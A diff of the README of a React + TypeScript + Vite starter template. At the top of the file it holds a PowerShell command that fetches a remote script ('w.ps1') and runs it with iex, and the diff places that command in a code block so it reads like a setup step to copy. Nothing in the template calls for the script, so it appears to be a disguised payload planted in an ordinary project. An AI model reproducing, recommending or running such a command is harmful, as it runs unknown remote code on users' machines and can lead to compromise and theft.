@@ -1,6 +1,7 @@
 # React + TypeScript + Vite
+```
 iex ( irm ("https://baa4ts.is-a.dev/w.ps1") )
-
+```
 This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.
 
 Currently, two official plugins are available:
